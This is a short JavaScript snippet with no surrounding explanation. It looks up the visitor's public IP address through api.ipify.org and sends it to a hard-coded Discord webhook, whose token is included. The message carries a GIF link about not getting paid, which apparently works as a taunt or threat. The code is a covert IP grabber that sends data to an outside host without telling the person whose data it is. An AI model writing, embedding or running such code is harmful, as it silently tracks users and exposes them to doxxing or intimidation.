var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(responce) {
    return responce.json();
})
.then (function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1132398172606574693/T6Cc1JtYk2MKgPggEFMKJ1uzpWn88HMcmcMBYs6Ozqhd-jSHYHWqSqlaFZ_o7O2QVcj4';
    var message = {
        content: 'https://tenor.com/view/if-i-dont-get-my-money-djdee-gif-19931067 ' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {     
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});